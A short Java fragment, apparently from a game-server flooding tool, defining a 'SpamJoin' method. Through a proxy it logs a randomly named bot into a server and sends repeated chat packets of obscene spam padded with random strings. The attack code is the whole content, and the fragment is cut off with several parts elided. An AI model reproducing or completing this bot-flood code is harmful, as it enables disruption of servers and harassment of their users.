...
public class SpamJoin implements Method {
    ...
    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        ...
        try {
            channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest("FLEX_OK_" + (new SecureRandom()).nextInt(9999))).getWrappedPacket()));
            for (int l = 0; l < 3; l++) {
                writePacket(compress(PacketUtils.createChatPacket("-" + RandomUtils.randomString(4) + "- SUCK MY DICK -" + RandomUtils.randomString(4) + "-"), 0), bbbb);
            }
